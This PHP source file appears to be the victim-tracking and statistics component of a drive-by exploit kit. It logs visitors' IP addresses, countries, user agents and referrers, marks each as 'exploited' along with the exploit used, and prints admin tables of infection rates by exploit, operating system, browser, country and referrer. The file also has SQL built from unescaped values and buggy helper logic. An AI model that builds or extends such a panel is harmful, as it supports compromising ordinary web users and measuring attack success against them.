<?
	require_once('ip2c.php');
	class CVisitors {
		var $sqlSettings;
		var $sql;
		
		var $OSList = array
		(
			'Windows 3.11' => 'Win16',
			'Windows 95' => '(Windows 95)|(Win95)|(Windows_95)',
			'Windows 98' => '(Windows 98)|(Win98)',
			'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
			'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
			'Windows Server 2003' => '(Windows NT 5.2)',
			'Windows Vista' => '(Windows NT 6.0)',
			'Windows 7' => '(Windows NT 7.0)|(Windows NT 6.1)',
			'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
			'Windows ME' => 'Windows ME',
			'Open BSD' => 'OpenBSD',
			'Sun OS' => 'SunOS',
			'Linux' => '(Linux)|(X11)',
			'Mac OS' => '(Mac_PowerPC)|(Macintosh)',
			'QNX' => 'QNX',
			'BeOS' => 'BeOS',
			'OS/2' => 'OS/2',
			'Search Bot'=>'(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
		);

		var $BrowserList = array
		(
			'Internet Explorer' => 'msie',
			'Mozilla Firefox' => 'firefox',
			'Google Chrome' => 'chrome',	
			'Apple Safari' => 'safari',
			'Opera' => 'opera'
			
		);
		
		function CVisitors(&$_sql, &$_sqlSettings) {
		  $this->sql = &$_sql;
		  $this->sqlSettings = &$_sqlSettings;
		}
		
				
		function getIpAddr()
		{			
			$ip = $_SERVER['REMOTE_ADDR'];			
			return $ip;
		}
		
		function getIpAddrCountry($ipAddress)
		{			
			$ip2c = new ip2country("include/ip-to-country.bin");
			$res = $ip2c->get_country($ipAddress);
			if ($res == false){
			  return "Unknown";
			}else{			  
			  $country = $res['name'];
			  if($country == ""){
				$country = "Unknown";
			  }
			  return $country ;
			}
		}
		
	function checkVisitor($userAgent, $ipAddress, $country)
		{
			
			$cq = new CQuery();
			
			$sql_result = mysql_query("SELECT 1 FROM " . $this->sqlSettings['tableVisitorsList'] . " LIMIT 0");
			if (!$sql_result)
			{
				echo "Error: Database table doesn't exist. Run install.php from the directory.";
				return;
			}
			
			$cq = new CQuery();
			
			$sql_result = mysql_query('SELECT ipAddress FROM ' . $this->sqlSettings['tableVisitorsList'] . ' WHERE ipAddress = \'' . $ipAddress . '\''); 
			$sql_rows = $cq->fetcharray($sql_result);
			mysql_free_result($sql_result);
			
			if($sql_rows) { 
				if($this->getIfVisitorExploitedByIp($ipAddress) == 1)
				{
					return true;
				} else {
					return false;
				}
			} else {
				$this->addUniqueVisitor($userAgent, $ipAddress, $country);
				return false;
			}
		}
		
		function getIfVisitorExploitedByIp($ipAddress) 
		{
			$cq = new CQuery();
			$sql_result = $cq->query('SELECT * FROM ' . $this->sqlSettings['tableVisitorsList'] . ' WHERE ipAddress = \'' . $ipAddress . '\'');
			$row = $cq->fetchassoc($sql_result);
			mysql_free_result($sql_result);
			return $row['exploited'];
		}
		
		function setVisitorExploited($ipAddress, $exploit)
		{
			$cq = new CQuery();
			$string = 'UPDATE  ' . $this->sqlSettings['tableVisitorsList'] . ' set exploited=1, exploit="' .  mysql_real_escape_string($exploit) . '" WHERE ipAddress = "' . $ipAddress . '";';
			$sql_result = $cq->query($string);			
			return;
		}
		
		function clearVisitors()
		{
			$cq = new CQuery();
			$sql_result = $cq->query('delete from ' . $this->sqlSettings['tableVisitorsList']);
			return;
		}

		function addUniqueVisitor($userAgent, $ipAddress, $country)
		{
			
			$referrer = $_GET["referrer"];
			if(!isset($referrer) || $referrer==""){
				$referrer = getenv('HTTP_REFERER');
			}
			
			$cq = new CQuery();
			$query = "INSERT INTO `" . $this->sqlSettings['dbName'] . "`.`" . $this->sqlSettings['tableVisitorsList'] . "` (
				`id` ,
				`ipAddress` ,
				`userAgent` ,
				`country` ,
				`referrer`,
				`exploited`
				)
				VALUES (
				NULL , '" . mysql_real_escape_string($ipAddress) . "', '" . mysql_real_escape_string($userAgent) . "', '" . mysql_real_escape_string($country) . "', '" . mysql_real_escape_string($referrer) . "', '0'
			);";			
			$sql_result = $cq->query($query);
		}
		
		function getUniqueVisitorsCount()
		{
			$cq = new CQuery();
			$sql_result = $cq->query("SELECT * FROM " . $this->sqlSettings['tableVisitorsList']);
			$visitorsCount = $cq->numrows($sql_result);
			return $visitorsCount;
		}

		function getVisitorsExploitedCount()
		{
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM ' . $this->sqlSettings['tableVisitorsList'] . ' WHERE exploited = \'1\'');
			$exploitedVisitorsCount = $cq->numrows($sql_result);
			return $exploitedVisitorsCount;
		}
		
		function showExploitsTable()
		{
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM `' . $this->sqlSettings['tableVisitorsList'] . "`");
			$exploitStack = array();
			while($row = $cq->fetchassoc($sql_result))
			{
				if($row['exploit'])
					$exploitStack[$row['exploit']] = $exploitStack[$row['exploit']] + 1;
			}
			echo("<table>
					<tr>
						<td>Exploit</td>
						<td>#</td>
						<td>%</td>
					</tr>
				");
			$countVisitors = $this->getUniqueVisitorsCount();			
			foreach($exploitStack as $cKey=>$cValue) {				
				
				if($cValue)
				{
					if($countVisitors == 0 || $cValue == 0){
						$exploitedPercentage = 0;
					}else{
						$exploitedPercentage = round($cValue * 100 / $countVisitors, 2);
					}
					echo("<tr>");
					echo("<td>" . $cKey . "</td>" . "<td>" . $cValue . "</td><td>" . $exploitedPercentage . "%</td>");
					echo("</tr>");
				}
			}
			echo("</table>");
		}		

		function showOSInformation()
		{	
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM `' . $this->sqlSettings['tableVisitorsList'] . "`");
			$OSStack = array("Unknown" => 0);
			$OSExploitedStack = array("Unknown" => 0);
			$identifiedOSCount = 0;
			while($row = $cq->fetchassoc($sql_result))
			{
				foreach($this->OSList as $CurrOS=>$Match)
				{
					if (eregi($Match, $row['userAgent']))
					{
						if($this->getIfKeyExistsInArray($CurrOS, $OSStack))
						{
							$OSStack[$CurrOS] = $OSStack[$CurrOS] + 1;
							if($row['exploited'])
								$OSExploitedStack[$CurrOS] = $OSExploitedStack[$CurrOS] + 1;
						}
						else
						{
							array_push($OSStack, array($CurrOS => 0));
							array_push($OSExploitedStack, array($CurrOS => 0));
							if($row['exploited'])
								$OSExploitedStack[$CurrOS] = $OSExploitedStack[$CurrOS] + 1;
							$OSStack[$CurrOS] = $OSStack[$CurrOS] + 1;
						}
						$identifiedOSCount = $identifiedOSCount + 1;
						break;
					}
				}
			}
			$OSStack["Unknown"] = $this->getUniqueVisitorsCount() - $identifiedOSCount;
			arsort($OSStack);
			echo("<table>
					<tr>
						<td>Operating System</td>
						<td>Total</td>
						<td>Exploited</td>
						<td>%</td>
					</tr>
				");
			$nOSStack = array();
			$nOSStackCount = array();
			foreach($OSStack as $cKey=>$cValue) {
				if($cValue)
				{
					if($cValue == 0 || $OSExploitedStack[$cKey] == 0){
						$OSExploitedStack[$cKey] = 0;
						$exploitedPercentage = 0;
					}else{
						$exploitedPercentage = round($OSExploitedStack[$cKey] * 100 / $cValue, 2);
					}
					array_push($nOSStack, $cKey);
					array_push($nOSStackCount, $cValue);
					echo("<tr>");
					echo("<td>" . $cKey . "</td>" . "<td>". $cValue . "</td>" . "<td>". $OSExploitedStack[$cKey] . "</td><td>" . $exploitedPercentage . "%</td></tr>");
				}
			}
			echo("</table>");

		}
		
		function showBrowserInformation()
		{	
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM `' . $this->sqlSettings['tableVisitorsList'] . "`");
			$OSStack = array("Unknown" => 0);
			$OSExploitedStack = array("Unknown" => 0);
			$identifiedOSCount = 0;
			while($row = $cq->fetchassoc($sql_result))
			{
				foreach($this->BrowserList as $CurrOS=>$Match)
				{
					if (eregi($Match, $row['userAgent']))
					{
						if($this->getIfKeyExistsInArray($CurrOS, $OSStack))
						{
							$OSStack[$CurrOS] = $OSStack[$CurrOS] + 1;
							if($row['exploited'])
								$OSExploitedStack[$CurrOS] = $OSExploitedStack[$CurrOS] + 1;
						}
						else
						{
							array_push($OSStack, array($CurrOS => 0));
							array_push($OSExploitedStack, array($CurrOS => 0));
							if($row['exploited'])
								$OSExploitedStack[$CurrOS] = $OSExploitedStack[$CurrOS] + 1;
							$OSStack[$CurrOS] = $OSStack[$CurrOS] + 1;
						}
						$identifiedOSCount = $identifiedOSCount + 1;
						break;
					}
				}
			}
			$OSStack["Unknown"] = $this->getUniqueVisitorsCount() - $identifiedOSCount;
			arsort($OSStack);
			echo("<table>
					<tr>
						<td>Browser</td>
						<td>Total</td>
						<td>Exploited</td>
						<td>%</td>
					</tr>
				");
			$nOSStack = array();
			$nOSStackCount = array();
			foreach($OSStack as $cKey=>$cValue) {
				if($cValue)
				{
					if($cValue == 0 || $OSExploitedStack[$cKey] == 0){
						$OSExploitedStack[$cKey] = 0;
						$exploitedPercentage = 0;
					}else{
						$exploitedPercentage = round($OSExploitedStack[$cKey] * 100 / $cValue, 2);
					}
					array_push($nOSStack, $cKey);
					array_push($nOSStackCount, $cValue);
					echo("<tr>");
					echo("<td>" . $cKey . "</td>" . "<td>". $cValue . "</td>" . "<td>". $OSExploitedStack[$cKey] . "</td><td>" . $exploitedPercentage . "%</td></tr>");
				}
			}
			echo("</table>");

		}

		function getIfKeyExistsInArray($key, $array)
		{
			foreach($array as $tkey=>$value)
				{
					if($tkey = $key)
					{
						return true;
					}
				}
			return false;
		}
		
		function showVisitorsCountryTop()
		{
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM `' . $this->sqlSettings['tableVisitorsList'] . "`");
			$countryStack = array();
			$countryStackCount = array();
			$countryStackExploitedCount = array();
			while($row = $cq->fetchassoc($sql_result))
			{
				if($this->getElementExistsInArray($row['country'],$countryStack))
				{
					$countryIndex = $this->getElementIndexInArray($row['country'], $countryStack);
					$countryStackCount[$countryIndex] = $countryStackCount[$countryIndex] + 1;
					if($row['exploited'])
					{
						$countryStackExploitedCount[$countryIndex] = $countryStackExploitedCount[$countryIndex] + 1;
					}
				}
				else
				{
					array_push($countryStack, $row['country']);
					array_push($countryStackCount, 1);
					if($row['exploited'])
					{
						array_push($countryStackExploitedCount, 1);
					}
					else
					{
						array_push($countryStackExploitedCount, 0);
					}
				}
			}

			arsort($countryStackCount);
			
			$this->sortArrayByArray($countryStack, $countryStackCount);
			$display = 5;
			$displayCount = 0;
			$otherCountriesCount = 0;
			$otherCountriesVisitorsCount = 0;
			$otherCountriesExploitedCount = 0;
			$nCountryStack = array();
			$nCountryStackCount = array();
			$nCountryStackExploitedCount = array();
			$nCountryStackExploitedCountries = array();
			$row = $countryStackCount;
			
			echo(
				"<table>
					<tr>
						<td>Country</td>
						<td style=\"width: 60px;\">Total</td>
						<td style=\"width: 60px;\">Exploited</td>
						<td style=\"width: 60px;\">%</td>
					</tr>"
			);
			
			foreach($row as $countryCount){
				$kindex = key($row);
				if($displayCount == $display)
				{
					$otherCountriesVisitorsCount = $otherCountriesVisitorsCount + $countryCount;
					$otherCountriesCount = $otherCountriesCount + 1;
					$otherCountriesExploitedCount = $otherCountriesExploitedCount + $countryStackExploitedCount[$kindex];
				}
				else
				{
					$tempPorcentage = $countryStackExploitedCount[$kindex] * 100 / $countryCount;
					echo("
							<tr>								
								<td>{$countryStack[$kindex]}</td>
								<td>{$countryCount}</td>
								<td>{$countryStackExploitedCount[$kindex]}</td>
								<td>" . round($tempPorcentage, 2) . "%</td>
							</tr>"
					);
					array_push($nCountryStack, $countryStack[$kindex]);
					array_push($nCountryStackCount, $countryCount);
					
					if($countryStackExploitedCount[$kindex])
					{
						array_push($nCountryStackExploitedCount, $countryStackExploitedCount[$kindex]);
						array_push($nCountryStackExploitedCountries, $countryStack[$kindex]);
					}
					
					$displayCount = $displayCount + 1;
				}
				next($row);
			} 
			
			if($otherCountriesVisitorsCount)
			{
				array_push($nCountryStack, "Others");
				array_push($nCountryStackCount, $otherCountriesVisitorsCount);
				array_push($nCountryStackExploitedCountries, "Others");
				array_push($nCountryStackExploitedCount, $otherCountriesExploitedCount);
			}
			
			if($otherCountriesVisitorsCount != 0)
			{
				$tempPorcentage = $otherCountriesExploitedCount * 100 / $otherCountriesVisitorsCount;
				echo("
						<tr>							
							<td>Other</td>
							<td>{$otherCountriesVisitorsCount}</td>
							<td>{$otherCountriesExploitedCount}</td>
							<td>" . round($tempPorcentage, 2) . "%</td>
						</tr>"
				);
			}
			echo("</table>");
			
			
		}

		function showVisitorsReferrerTop()
		{
			$cq = new CQuery();
			$sql_result = mysql_query('SELECT * FROM `' . $this->sqlSettings['tableVisitorsList'] . "`");
			$countryStack = array();
			$countryStackCount = array();
			$countryStackExploitedCount = array();
			while($row = $cq->fetchassoc($sql_result))
			{
				if($row['referrer']=="") continue;
				if($this->getElementExistsInArray($row['referrer'],$countryStack))
				{
					$countryIndex = $this->getElementIndexInArray($row['referrer'], $countryStack);
					$countryStackCount[$countryIndex] = $countryStackCount[$countryIndex] + 1;
					if($row['exploited'])
					{
						$countryStackExploitedCount[$countryIndex] = $countryStackExploitedCount[$countryIndex] + 1;
					}
				}
				else
				{
					array_push($countryStack, $row['referrer']);
					array_push($countryStackCount, 1);
					if($row['exploited'])
					{
						array_push($countryStackExploitedCount, 1);
					}
					else
					{
						array_push($countryStackExploitedCount, 0);
					}
				}
			}

			arsort($countryStackCount);
			
			$this->sortArrayByArray($countryStack, $countryStackCount);
			$display = 5;
			$displayCount = 0;
			$otherCountriesCount = 0;
			$otherCountriesVisitorsCount = 0;
			$otherCountriesExploitedCount = 0;
			$nCountryStack = array();
			$nCountryStackCount = array();
			$nCountryStackExploitedCount = array();
			$nCountryStackExploitedCountries = array();
			$row = $countryStackCount;
			
			echo(
				"<table>
					<tr>
						<td>Refferer</td>
						<td style=\"width: 60px;\">Total</td>
						<td style=\"width: 60px;\">Exploited</td>
						<td style=\"width: 60px;\">%</td>
					</tr>"
			);
			
			foreach($row as $countryCount){
				$kindex = key($row);
				if($displayCount == $display)
				{
					$otherCountriesVisitorsCount = $otherCountriesVisitorsCount + $countryCount;
					$otherCountriesCount = $otherCountriesCount + 1;
					$otherCountriesExploitedCount = $otherCountriesExploitedCount + $countryStackExploitedCount[$kindex];
				}
				else
				{
					$tempPorcentage = $countryStackExploitedCount[$kindex] * 100 / $countryCount;
					echo("
							<tr>								
								<td>{$countryStack[$kindex]}</td>
								<td>{$countryCount}</td>
								<td>{$countryStackExploitedCount[$kindex]}</td>
								<td>" . round($tempPorcentage, 2) . "%</td>
							</tr>"
					);
					array_push($nCountryStack, $countryStack[$kindex]);
					array_push($nCountryStackCount, $countryCount);
					
					if($countryStackExploitedCount[$kindex])
					{
						array_push($nCountryStackExploitedCount, $countryStackExploitedCount[$kindex]);
						array_push($nCountryStackExploitedCountries, $countryStack[$kindex]);
					}
					
					$displayCount = $displayCount + 1;
				}
				next($row);
			} 
			
			if($otherCountriesVisitorsCount)
			{
				array_push($nCountryStack, "Others");
				array_push($nCountryStackCount, $otherCountriesVisitorsCount);
				array_push($nCountryStackExploitedCountries, "Others");
				array_push($nCountryStackExploitedCount, $otherCountriesExploitedCount);
			}
			
			if($otherCountriesVisitorsCount != 0)
			{
				$tempPorcentage = $otherCountriesExploitedCount * 100 / $otherCountriesVisitorsCount;
				echo("
						<tr>
							<td>Other</td>
							<td>{$otherCountriesVisitorsCount}</td>
							<td>{$otherCountriesExploitedCount}</td>
							<td>" . round($tempPorcentage, 2) . "%</td>
						</tr>"
				);
			}
			echo("</table>");
			
			
		}

		function sortArrayByArray($array,$orderArray) {
			$ordered = array();
			foreach($orderArray as $key) {
				if(array_key_exists($key,$array)) {
						$ordered[$key] = $array[$key];
						unset($array[$key]);
				}
			}
			return $ordered + $array;
		}

		function getElementExistsInArray($element, $array)
		{
			for($i = 0; $i < count($array); $i++)
			{
				if(strcasecmp($array[$i], $element)==0)
				{
					return true;
				}
			}
			return false;
		}
		
		function getElementIndexInArray($element, $array)
		{
			for($i = 0; $i < count($array); $i++)
			{
				if(strcasecmp($array[$i], $element)==0)
				{
					return $i;
				}
			}
			return false;
		}
		
		function showVisitorsList()
		{
			$cq =  new CQuery();
			$sql_result = $cq->query("SELECT * FROM `" . $this->sqlSettings['tableVisitorsList'] . "`");
			echo <<<HTML
				<table>
					<tr>
						<td class="header">Id</td>
						<td class="header">Ip Address</td>
						<td class="header">Country</td>
						<td class="header">Exploited</td>
					</tr>
HTML;
			while($row = $cq->fetchassoc($sql_result)) {
				$sql_result2 = $cq->query("SELECT * FROM `" . $this->sqlSettings['dbVisitorsExploits'] . "` WHERE visitor_id ='" .mysql_real_escape_string($row['id']) . "'");
				echo("<tr>");
				echo("<td>" . $row['id'] . "</td>");
				echo("<td>" . $row['ipAddress'] . "</td>");
				echo("<td>");
				echo($row['country'] . "</td>");
				echo("<td>");
				if($row['exploited'])
				{
					echo("YES");
				} else {
					echo("NO");
				}
				echo("</td>");
				echo("</tr>");
			}
			echo("</table>");
		}
	}
?>